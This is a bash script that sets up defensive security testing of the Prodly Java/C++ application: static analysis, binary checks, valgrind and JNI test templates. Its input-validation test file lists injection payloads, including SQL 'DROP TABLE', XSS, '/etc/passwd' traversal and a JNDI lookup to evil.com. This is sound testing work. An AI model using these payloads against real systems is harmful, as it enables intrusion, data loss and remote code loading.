#!/bin/bash
# Security Testing Automation Script for Prodly Application
# Run this script in Kali Linux after setting up the application

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Configuration
APP_DIR="${1:-$(pwd)}"
REPORT_DIR="/tmp/prodly_security_reports_$(date +%Y%m%d_%H%M%S)"
CPP_CORE_DIR="$APP_DIR/cpp_core"
JAVA_GUI_DIR="$APP_DIR/java_gui"

echo -e "${GREEN}=== Prodly Security Testing Script ===${NC}"
echo "Application Directory: $APP_DIR"
echo "Report Directory: $REPORT_DIR"
echo ""

# Create report directory
mkdir -p "$REPORT_DIR"

# Function to log results
log_result() {
    echo -e "$1" | tee -a "$REPORT_DIR/report.txt"
}

log_result "=== Security Testing Report ==="
log_result "Date: $(date)"
log_result "Application: Prodly v3"
log_result "Test Environment: Kali Linux"
log_result ""

# Check prerequisites
echo -e "${YELLOW}[*] Checking prerequisites...${NC}"
log_result "=== Prerequisites Check ==="

check_tool() {
    if command -v "$1" &> /dev/null; then
        log_result "[✓] $1 installed: $(command -v $1)"
        return 0
    else
        log_result "[✗] $1 not found"
        return 1
    fi
}

check_tool java
check_tool mvn
check_tool cmake
check_tool g++
check_tool cppcheck
check_tool valgrind
check_tool strings
check_tool readelf
check_tool gdb

log_result ""

# Static Code Analysis - C++
echo -e "${YELLOW}[*] Running C++ static code analysis...${NC}"
log_result "=== C++ Static Code Analysis ==="

if [ -d "$CPP_CORE_DIR/src" ]; then
    cd "$CPP_CORE_DIR"
    
    if command -v cppcheck &> /dev/null; then
        cppcheck --enable=all --xml --xml-version=2 \
            --output-file="$REPORT_DIR/cppcheck.xml" \
            src/ 2>&1 | tee "$REPORT_DIR/cppcheck.txt"
        log_result "Cppcheck analysis completed. See: $REPORT_DIR/cppcheck.txt"
    else
        log_result "Cppcheck not installed. Install with: sudo apt install cppcheck"
    fi
    
    if command -v flawfinder &> /dev/null; then
        flawfinder src/ > "$REPORT_DIR/flawfinder.txt" 2>&1
        log_result "Flawfinder analysis completed. See: $REPORT_DIR/flawfinder.txt"
    fi
else
    log_result "[✗] C++ source directory not found: $CPP_CORE_DIR/src"
fi

log_result ""

# Binary Analysis
echo -e "${YELLOW}[*] Analyzing binary library...${NC}"
log_result "=== Binary Analysis ==="

LIB_PATH="$CPP_CORE_DIR/build/libprodlyjni.so"
if [ -f "$LIB_PATH" ]; then
    log_result "Library found: $LIB_PATH"
    
    # File information
    file "$LIB_PATH" | tee -a "$REPORT_DIR/binary_analysis.txt"
    
    # Strings analysis
    log_result "=== Strings Analysis ==="
    strings "$LIB_PATH" | grep -iE "password|secret|key|token|api|auth" \
        > "$REPORT_DIR/sensitive_strings.txt" 2>&1 || true
    
    if [ -s "$REPORT_DIR/sensitive_strings.txt" ]; then
        log_result "[!] Potential sensitive strings found. See: $REPORT_DIR/sensitive_strings.txt"
    else
        log_result "[✓] No obvious sensitive strings found"
    fi
    
    # ELF analysis
    if command -v readelf &> /dev/null; then
        readelf -h "$LIB_PATH" >> "$REPORT_DIR/binary_analysis.txt" 2>&1
        readelf -d "$LIB_PATH" >> "$REPORT_DIR/binary_analysis.txt" 2>&1
    fi
    
    # Check security features
    if command -v checksec &> /dev/null; then
        checksec --file="$LIB_PATH" >> "$REPORT_DIR/binary_analysis.txt" 2>&1
    fi
    
    log_result "Binary analysis completed. See: $REPORT_DIR/binary_analysis.txt"
else
    log_result "[✗] Library not found: $LIB_PATH"
    log_result "[!] Build the library first: cd $CPP_CORE_DIR && mkdir -p build && cd build && cmake .. && make"
fi

log_result ""

# Java Code Analysis
echo -e "${YELLOW}[*] Running Java static code analysis...${NC}"
log_result "=== Java Static Code Analysis ==="

if [ -d "$JAVA_GUI_DIR" ]; then
    cd "$JAVA_GUI_DIR"
    
    if [ -d "target/classes" ]; then
        if command -v spotbugs &> /dev/null; then
            spotbugs -textui -output "$REPORT_DIR/spotbugs.txt" \
                target/classes/ 2>&1 || true
            log_result "SpotBugs analysis completed. See: $REPORT_DIR/spotbugs.txt"
        else
            log_result "[!] SpotBugs not installed. Install with: sudo apt install spotbugs"
        fi
    else
        log_result "[!] Classes not found. Build first: cd $JAVA_GUI_DIR && mvn compile"
    fi
else
    log_result "[✗] Java GUI directory not found: $JAVA_GUI_DIR"
fi

log_result ""

# Memory Safety Testing
echo -e "${YELLOW}[*] Preparing memory safety tests...${NC}"
log_result "=== Memory Safety Testing ==="

if [ -f "$JAVA_GUI_DIR/target/prodly-gui-1.0.0.jar" ] && [ -f "$LIB_PATH" ]; then
    log_result "Application files found. Memory testing can be performed manually."
    log_result "Run: valgrind --leak-check=full --show-leak-kinds=all \\"
    log_result "     java -Djava.library.path=$CPP_CORE_DIR/build \\"
    log_result "          -jar $JAVA_GUI_DIR/target/prodly-gui-1.0.0.jar"
    log_result ""
    log_result "Or use the automated test below (requires manual interaction):"
    log_result "See: $REPORT_DIR/valgrind_test.sh"
    
    # Create valgrind test script
    cat > "$REPORT_DIR/valgrind_test.sh" << EOF
#!/bin/bash
# Valgrind memory test script
export LD_LIBRARY_PATH=$CPP_CORE_DIR/build:\$LD_LIBRARY_PATH

valgrind --leak-check=full \\
         --show-leak-kinds=all \\
         --track-origins=yes \\
         --verbose \\
         --log-file=$REPORT_DIR/valgrind_output.txt \\
    java -Djava.library.path=$CPP_CORE_DIR/build \\
         -jar $JAVA_GUI_DIR/target/prodly-gui-1.0.0.jar

echo "Valgrind test completed. Check: $REPORT_DIR/valgrind_output.txt"
EOF
    chmod +x "$REPORT_DIR/valgrind_test.sh"
else
    log_result "[✗] Application not built. Build first before memory testing."
fi

log_result ""

# Input Validation Test Cases
echo -e "${YELLOW}[*] Creating input validation test cases...${NC}"
log_result "=== Input Validation Test Cases ==="

cat > "$REPORT_DIR/input_test_cases.txt" << 'EOF'
# Input Validation Test Cases

## Integer Overflow Tests
- Contract Value: 999999999999999
- Contract Duration: 999999
- Data Volume: 999999999999
- API Dependencies: -1, 999999

## Negative Value Tests
- Contract Value: -1000
- Contract Duration: -12
- Data Volume: -500
- Switching Cost: -5000

## String Injection Tests
- Vendor ID: '; DROP TABLE vendors; --
- Vendor Name: <script>alert('XSS')</script>
- Vendor ID: ../../etc/passwd
- Vendor Name: ${jndi:ldap://evil.com/a}

## Buffer Overflow Tests
- Vendor ID: $(python -c "print('A' * 1000)")
- Vendor Name: $(python -c "print('B' * 2000)")
- Very long strings (1000+ characters)

## Special Character Tests
- Vendor ID: ' " ; < > & | \ /
- Vendor Name: !@#$%^&*()_+-=[]{}|;:,.<>?

## NULL/Empty Tests
- Empty vendor ID
- Empty vendor name
- NULL values
- Whitespace-only inputs

## Format Validation Tests
- Invalid date formats
- Invalid number formats
- Unicode characters
- Control characters
EOF

log_result "Input validation test cases created: $REPORT_DIR/input_test_cases.txt"

log_result ""

# JNI Security Test Template
echo -e "${YELLOW}[*] Creating JNI security test template...${NC}"
log_result "=== JNI Security Testing ==="

cat > "$REPORT_DIR/jni_test_template.java" << 'EOF'
// JNI Security Test Template
// Compile: javac -cp . jni_test_template.java
// Run: java -Djava.library.path=../cpp_core/build jni_test_template

public class jni_test_template {
    static {
        try {
            System.loadLibrary("prodlyjni");
            System.out.println("[✓] Library loaded successfully");
        } catch (UnsatisfiedLinkError e) {
            System.err.println("[✗] Failed to load library: " + e);
            System.exit(1);
        }
    }
    
    // Add native method declarations here based on your JNI interface
    // Example:
    // private native void testMethod(String input);
    
    public static void main(String[] args) {
        System.out.println("=== JNI Security Tests ===");
        
        // Test 1: NULL pointer handling
        System.out.println("\n[Test 1] NULL pointer test");
        try {
            // testMethod(null);
            System.out.println("  [✓] NULL handled gracefully");
        } catch (Exception e) {
            System.out.println("  [✗] NULL caused exception: " + e);
        }
        
        // Test 2: Invalid array bounds
        System.out.println("\n[Test 2] Array bounds test");
        try {
            int[] arr = new int[0];
            // testMethod(arr);
            System.out.println("  [✓] Empty array handled");
        } catch (Exception e) {
            System.out.println("  [✗] Empty array caused exception: " + e);
        }
        
        // Test 3: Large input
        System.out.println("\n[Test 3] Large input test");
        try {
            int[] largeArr = new int[1000000];
            // testMethod(largeArr);
            System.out.println("  [✓] Large input handled");
        } catch (Exception e) {
            System.out.println("  [✗] Large input caused exception: " + e);
        }
        
        System.out.println("\n=== Tests Complete ===");
    }
}
EOF

log_result "JNI test template created: $REPORT_DIR/jni_test_template.java"

log_result ""

# Network Security Testing
echo -e "${YELLOW}[*] Creating network testing guide...${NC}"
log_result "=== Network Security Testing ==="

cat > "$REPORT_DIR/network_test_guide.txt" << 'EOF'
# Network Security Testing Guide

## If Application Has Network Components:

1. **Port Scanning**
   nmap -sV -sC localhost
   nmap -p- 127.0.0.1

2. **Traffic Capture**
   sudo tcpdump -i any -w capture.pcap
   # Or use Wireshark GUI

3. **Traffic Analysis**
   tshark -r capture.pcap -Y "http or tcp"
   tshark -r capture.pcap -T fields -e http.request.uri

4. **SSL/TLS Testing** (if applicable)
   sslscan localhost:443
   testssl.sh localhost:443

## For Desktop Application:
- Check if application makes any network connections
- Monitor with: sudo netstat -tulpn | grep java
- Use Wireshark to capture all traffic
EOF

log_result "Network testing guide created: $REPORT_DIR/network_test_guide.txt"

log_result ""

# Summary
echo -e "${GREEN}[✓] Security testing preparation complete!${NC}"
log_result "=== Summary ==="
log_result "All test reports and scripts saved to: $REPORT_DIR"
log_result ""
log_result "Next Steps:"
log_result "1. Review static analysis reports"
log_result "2. Run memory tests: $REPORT_DIR/valgrind_test.sh"
log_result "3. Perform input validation tests using: $REPORT_DIR/input_test_cases.txt"
log_result "4. Test JNI security using: $REPORT_DIR/jni_test_template.java"
log_result "5. Review all findings and create final security report"

echo ""
echo -e "${GREEN}=== Testing Complete ===${NC}"
echo "Reports saved to: $REPORT_DIR"
echo ""
echo "View main report:"
echo "  cat $REPORT_DIR/report.txt"
echo ""
echo "List all reports:"
echo "  ls -lh $REPORT_DIR/"



